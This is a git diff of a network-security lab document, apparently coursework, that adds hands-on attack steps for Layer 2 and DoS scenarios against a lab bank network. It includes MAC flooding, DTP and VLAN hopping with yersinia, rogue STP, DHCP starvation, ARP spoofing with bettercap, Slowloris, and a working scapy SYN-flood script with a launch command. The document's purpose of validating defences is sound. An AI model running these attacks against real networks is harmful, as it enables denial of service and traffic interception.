@@ -1,11 +1,3 @@
-# Security Validation & Threat Scenarios (`ATTACKS.md`)
-
-> **Note:** This document outlines the theoretical attack scenarios covered across Labs 1.1–3.5, mapped to the Punggol Bank (`gruppesechs.sitict.net`) architecture, along with the **expected defensive response** and **defensive verification commands** to demonstrate and validate each control on the switches, routers, firewalls, and servers.
-
----
-
-## Module 1: Layer 2 Access Switch Threat Scenarios (`SW1`–`SW4`)
-
 ### 1. Lab 1.1 — CAM Table Exhaustion / MAC Flooding
 * **Target Component:** Access switches (`SW1` VLAN 23, `SW2` VLAN 46, `SW3` VLAN 61, `SW4` VLAN 67) on end-user access ports (`Gi1/0/5+`).
 * **Theoretical Mechanism:** An attacker on an access port transmits frames with randomized source MAC addresses to fill the Content Addressable Memory (CAM) table, attempting to force the switch into failing open and broadcasting unicast frames across all ports.
@@ -22,6 +14,13 @@
   ```
   *(To clear learned sticky MACs after testing: `clear port-security sticky interface GigabitEthernet1/0/5`)*
 
+attack
+- connect to either sw1 ports 5-16, sw2 5-7, sw3 5-6, or sw4 5-7
+- load kali
+- sudo macof to continuously generate random MAC addresses to flood 
+- port goes into err-disabled
+- recover automatically after 300 seconds or manually `clear port-security sticky interface <interface>`
+- show port-security to verify 
 ---
 
 ### 2. Lab 1.2 — Switch Spoofing (DTP Trunk Negotiation & Dormant Port Abuse)
@@ -40,6 +39,13 @@
   show vlan id 727
   ```
 
+attack
+- connect to either sw1 ports 5-16, sw2 5-7, sw3 5-6, or sw4 5-7
+- on kali, use sudo yersinia -I
+- press h then g then DTP mode, then x to execute, then 1 to launch dtp attack
+- trunk does not establish, every user port is set to nonegotiate and manually set to access
+- unused ports are set to vlan 727 and shutdown
+
 ---
 
 ### 3. Lab 1.3 — 802.1Q Double-Tagging (Native VLAN Hopping)
@@ -54,6 +60,11 @@
   show vlan id 821
   ```
 
+attack
+- connect to either sw1 ports 5-16, sw2 5-7, sw3 5-6, or sw4 5-7
+- on kali, use sudo yersinia -I
+- press h then g then 802.1q, assign VLAN 821 as native
+- fails as end user ports are not in VLAN 821
 ---
 
 ### 4. Lab 1.4 — Rogue STP Root Bridge Hijacking (BPDU Injection)
@@ -72,6 +83,14 @@
   show logging | include SPANTREE-2-BLOCK_BPDUGUARD
   ```
 
+attack
+- sudo ip link add name br0 type bridge
+- sudo ip link set eth0 master br0
+- sudo ip link set eth1 master br0
+- sudo ip link set br0 up
+- sudo brctl stp br0 on
+- sudo ip link set dev br0 type bridge priority 1
+- attack is prevented as all end user ports/oob ports are set to portfast and bpduguard enable
 ---
 
 ### 5. Lab 1.5 — DHCP Starvation & Rogue DHCP Server Spoofing
@@ -96,6 +115,12 @@
   sudo journalctl -u isc-dhcp-server -n 50
   ```
 
+attack
+- sudo apt install ./dhcpig_2.7.3-1_all.deb
+- sudo dhcpig-web-open
+- select int eth0, mode dhcp exhaustion and start
+- attack is prevented, ip dhcp snooping is enabled with trust only on links towards dsw
+
 ---
 
 ### 6. Lab 1.6 — ARP Cache Poisoning / Gratuitous ARP MitM
@@ -111,6 +136,16 @@
   show logging | include SW_DAI
   ```
 
+attack
+- sudo bettercap
+- net.probe on
+- net.probe off
+- net.show
+- set arp.spoof.targets 172.16.0.x
+- set arp.spoof.targets.fullduplex true
+- arp.spoof on
+- attack fails as arp inspection is on.
+
 ---
 
 ### 7. Lab 1.7 — IP & MAC Address Spoofing
@@ -124,6 +159,8 @@
   show ip source binding
   ```
 
+attack
+- fails as we have dhcp snooping...
 ---
 
 ## Module 2: Layer 3/4, Firewall & Server Threat Scenarios
@@ -204,6 +241,10 @@
   sudo journalctl -u named -n 50
   ```
 
+attack
+- using hping to spoof as a ip address in our network to an intemediary, lets say STAFF vlan who will have 12 end devices
+- this fails as we have an acl that blocks packets with spoofed source ip belonging to our public block and internal block
+
 ---
 
 ### 11. Lab 2.5 — TCP SYN Flood DoS
@@ -229,6 +270,34 @@
   ss -s
   ```
 
+tcpsynflood.py
+  ```text
+  import sys
+  from scapy.all import *
+  from multiprocessing import Pool
+  def synFlood(targetIP, targetPort):
+      ip = IP(id=RandShort(), src=RandIP(), dst=targetIP)
+      tcp = TCP(
+          sport = RandShort(), 
+          dport = targetPort,
+      seq = RandInt(),
+          flags = "S"
+      )
+      pkt = ip / tcp
+      send(pkt, loop=1, verbose=0)
+  args = sys.argv[1:]
+  if __name__ == "__main__":`
+      tIP = args[0]
+      tP = int(args[1])
+      numProcess = 1
+      dataList = [(tIP, tP) for _ in range(numProcess)]
+      with Pool(processes=numProcess) as p:
+          p.starmap(synFlood, dataList)
+  ```
+attack
+- using tcpsynflood.py to attack VM100 web server
+- run sudo python3 tcpsynflood.py 203.149.210.189 443
+
 ---
 
 ### 12. Lab 2.6 — Slowloris Low-Rate HTTP DoS
@@ -251,6 +320,12 @@
   sudo tail -n 30 /var/log/nginx/access.log /var/log/nginx/error.log
   ss -tn state established '( dport = :http or dport = :https )'
   ```
+
+attack
+- use slowhttptest
+- sudo slowhttptest -c 1000 https://gruppesechs.sitic.net
+- attack is preventend, similar logic to tcp syn flood
+- using mpf to defend
 
 ---
 
